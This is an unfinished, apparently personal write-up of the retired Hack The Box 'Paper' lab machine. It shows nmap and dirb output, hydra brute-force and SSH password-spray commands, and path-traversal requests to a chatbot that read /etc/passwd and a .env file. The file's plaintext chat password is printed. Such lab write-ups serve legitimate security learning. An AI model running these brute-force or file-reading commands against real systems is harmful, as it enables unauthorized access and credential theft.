# Paper

# nmap
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   124.04 ms 10.10.14.1
2   132.14 ms 10.10.11.143
```

## dirb

---- Scanning URL: http://10.10.11.143/manual/ ----
==> DIRECTORY: http://10.10.11.143/manual/developer/                                                                                   
==> DIRECTORY: http://10.10.11.143/manual/faq/                                                                                         
==> DIRECTORY: http://10.10.11.143/manual/howto/                                                                                       
==> DIRECTORY: http://10.10.11.143/manual/images/  

### apache with custom header
`X-Backend-Server: office.paper` - pointing to the domain

valid users - `Prisonmike`, `Nick`

`hydra office.paper -l Prisonmike -P pass.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2F&testcookie=1:F=incorrect"
` - hydra sprawy to find valid passowrd for wordpress user

wordpress version in the response from server
`?ver=5.2.3` with know vulnerabilities
https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/

register new account - `http://chat.office.paper/register/8qozr226AhkCHZdyY`


`hydra -l dwight -P pass.txt 10.10.11.143 -t 64 ssh` - hydra ssh password spray

recyclops bot interaction:
 - `recyclops list ../`
 - `recyclops file ../../../etc/passwd`
-  `recyclops file ../hubot/.env`

password was hidden in ../hubot/.env, but user to ssh is actually `dwight`
```
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```



Not finished,
to end this machines, I will be forced to buy premium, couse this machine is retired now ;/